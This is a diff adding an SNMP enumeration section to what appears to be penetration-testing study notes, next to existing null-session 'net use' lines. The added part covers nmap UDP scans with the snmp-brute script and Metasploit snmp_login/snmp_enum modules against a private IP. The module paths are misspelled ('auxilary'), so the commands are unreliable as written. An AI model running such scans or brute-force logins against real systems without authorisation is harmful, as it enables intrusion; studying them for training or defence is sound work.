@@ -82,5 +82,21 @@ net use
 net use \\10.10.10.1\e ""\user:""
 net use \\10.10.10.1\e ""/user:""
 ```
+* SNMP Enumeration
+```shell
+nmap -sU -p 161 10.10.1.2
+nmap -sU -p 161 --script=snmp-brute 10.10.1.2
 
+# Expoilt SNMP with Metasploit
+msfdb init && msfconsole ↵
+use auxilary/scanner/snmp/snmp_login ↵
+set RHOSTS 10.10.1.2 ↵
+exploit ↵
+  
+use auxilary/scanner/snmp/snmp_enum ↵
+set RHOSTS 10.10.1.2 ↵
+exploit ↵
+```
+
+  
 </details>
